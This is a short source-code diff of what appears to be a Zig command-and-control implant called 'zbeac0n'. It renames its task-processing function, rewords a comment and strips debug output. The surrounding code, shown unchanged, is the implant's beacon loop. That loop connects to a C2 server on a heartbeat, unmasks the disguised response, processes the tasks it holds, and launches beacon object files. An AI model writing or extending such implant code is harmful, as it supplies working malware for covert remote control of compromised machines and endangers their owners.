@@ -569,7 +569,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *zbeac0n.State, task
     } else return error.FailedToRunBof;
 }
 
-fn processCommands(allocator: std.mem.Allocator, state: *zbeac0n.State, resp_content: []u8) !void {
+fn processTasks(allocator: std.mem.Allocator, state: *zbeac0n.State, resp_content: []u8) !void {
     var task_fields = std.array_list.Managed([]const u8).init(allocator);
     defer task_fields.deinit();
 
@@ -789,7 +789,7 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
 
     while (true) {
 
-        // connect to C2 server
+        // connect to the C2 server
         const net_conn = state.implant_actions.netConnect(&state, zbeac0n.netConnectionType.Heartbeat, null);
 
         if (net_conn) |conn| {
@@ -803,11 +803,9 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
                 const unmasked_resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netUnmasquerade(&state, zbeac0n.netConnectionType.Heartbeat, resp_content, &body_len));
 
                 if (unmasked_resp_content) |buf| {
-                //if (resp_content) |buf| {
-                    std.log.info("Before processCommands", .{});
-                    processCommands(allocator, &state, buf[0..body_len]) catch {};
-                    std.log.info("After processCommands", .{});
-                    bofapi.print(.output, "Test: -perm {d}\n", .{body_len});
+                    std.log.info("Before processTasks", .{});
+                    processTasks(allocator, &state, buf[0..body_len]) catch {};
+                    std.log.info("After processTasks", .{});
                 }
             }
 
